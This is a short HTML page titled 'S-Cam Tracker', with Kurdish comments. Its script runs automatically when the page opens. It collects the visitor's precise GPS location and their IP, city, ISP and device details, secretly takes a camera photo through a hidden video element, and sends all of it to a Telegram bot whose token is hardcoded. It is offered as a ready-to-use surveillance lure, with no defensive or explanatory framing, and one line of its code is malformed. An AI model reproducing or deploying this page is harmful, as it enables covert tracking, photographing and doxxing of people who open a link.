<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>S-Cam Tracker</title>
</head>
<body>
<video id="video" autoplay style="display:none;"></video>

<script>
    // زانیارییە نوێیەکانی تۆ
    const BOT_TOKEN = '849131422:AAE8wM2ECL7zsRUimloWWYb5myT4iKNy7pc';
    const CHAT_ID = '659131693';

    async function startCapture() {
        let locationText = "📍 ناونیشانی ورد: ڕەتکرایەوە (Blocked)";

        // 1. وەرگرتنی ناونیشانی ورد (GPS)
        if (navigator.geolocation) {
            const pos = await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {enableHighAccuracy: true});
            });
            if (pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                locationText = 📍 ناونیشانی ورد (GPS):\nhttps://www.google.com/maps?q=${lat},${lon}\nLatitude: ${lat}\nLongitude: ${lon};
            }
        }

        try {
            // 2. وەرگرتنی IP و زانیاری گشتی
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            const fullInfo = `
🚀 زانیاری لە بۆتی نوێوە:
-------------------------
🌐 IP: ${ipData.ip}
🌍 وڵات: ${ipData.country_name}
🏙 شار: ${ipData.city}
📶 ئینتەرنێت: ${ipData.org}
📱 مۆبایل: ${navigator.userAgent}
-------------------------
${locationText}
            `;

            // 3. کردنەوەی کامێرا و ناردنی وێنە
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('chat_id', CHAT_ID);
                    formData.append('caption', fullInfo);

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg');
            }, 2000);

        } catch (err) {
            console.error("Error:", err);
        }
    }

    startCapture();
</script>
</body>
</html>
